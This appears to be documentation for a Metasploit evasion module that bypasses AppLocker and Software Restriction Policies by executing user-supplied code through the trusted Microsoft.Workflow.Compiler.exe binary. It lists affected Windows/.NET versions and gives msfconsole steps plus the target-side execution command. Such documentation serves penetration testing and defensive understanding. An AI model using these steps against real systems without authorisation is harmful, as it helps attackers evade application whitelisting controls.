## Intro

This module is designed to evade solutions such as software restriction policies and Applocker.
Applocker in its default configuration will block code in the form of executables (.exe and .com, .msi), scripts (.ps1, .vbs, .js) and dll's from running in user controlled directories.
Applocker enforces this by employing whitelisting, in that code can only be run from the protected directories and sub directories of "Program Files" and "Windows"
The main vector for this bypass is to use the trusted binary Microsoft.Workflow.Compiler.exe to execute user supplied code as this binary is located within the trusted Windows directory.

## Vulnerable Application

This evasion will work on all versions of Windows that include .NET versions 3.5 or greater that has solutions such as Applocker or Software Restriction Policies active, that do not explicitly block Microsoft.Workflow.Compiler.exe or the "Microsoft.Net" directory.

## Options

- **XOML_FILE** - Filename for the evasive file (default: workflow.xoml).
- **XML_FILE** - Filename for the .snk file (default: workflow.xml).

## Verification Steps

  1. Start `msfconsole`
  2. Do: `use evasion/windows/applocker_evasion_workflow_compiler`
  3. Do: `set PAYLOAD <payload>`
  4. Do: `run`
  5. The module will now display instructions of how to proceed
  6. `[+] workflow.xoml stored at /root/.msf4/local/workflow.xoml`
  7. `[+] workflow.xml stored at /root/.msf4/local/workflow.xml`
  8. `[*] Copy workflow.xoml and workflow.xml to the target`
  9. `[*] Execute using: C:\Windows\Microsoft.Net\Framework64\[.NET Version]\Microsoft.Workflow.Compiler.exe workflow.xml GQi` replace [.NET Version] with the version directory present on the target (typically "v4.0.30319").

## References

https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb
